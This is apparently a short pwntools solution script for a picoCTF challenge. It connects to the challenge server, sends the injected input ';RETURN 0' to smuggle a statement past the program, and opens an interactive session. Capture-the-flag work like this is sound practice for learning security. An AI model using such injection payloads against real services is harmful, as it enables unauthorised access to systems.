from pwn import *

r = remote("verbal-sleep.picoctf.net", 61138)
r.sendline(b";RETURN 0")
r.interactive()



